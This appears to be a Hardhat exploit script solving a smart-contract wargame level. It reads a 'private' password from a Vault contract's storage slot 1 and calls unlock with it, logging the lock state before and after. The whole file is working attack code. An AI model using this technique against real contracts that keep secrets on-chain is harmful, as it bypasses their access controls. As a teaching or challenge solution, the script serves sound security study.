import { ethers } from "hardhat"
import { VAULT } from "../constants"

const exploitVault = async () => {
    const accounts = await ethers.getSigners()
    const myWallet = accounts[0]

    const vaultContract = await ethers.getContractAt("Vault", VAULT)
    console.log("pwrd lock state before exploit is", await vaultContract.locked())
    // as per the contract structue
    // 0 slot in storage is occupied by bool (locked) - 1 byte
    // 1 slot in storage is occupied by bytes32 (password) - 32 bytes
    // notice that since each slot is 32 bytes, password has to be stored in slot 1

    const pwrdStorage = ethers.provider.getStorageAt(VAULT, 1)

    const unlockTx = await vaultContract.unlock(pwrdStorage)
    await unlockTx.wait(1) // wait 1 block

    console.log("pwrd lock state after exploit is", await vaultContract.locked())
}

exploitVault()
    .then(() => {
        console.log("exploit vault completed")
        process.exit(0)
    })
    .catch((e) => {
        console.error(e)
        process.exit(1)
    })
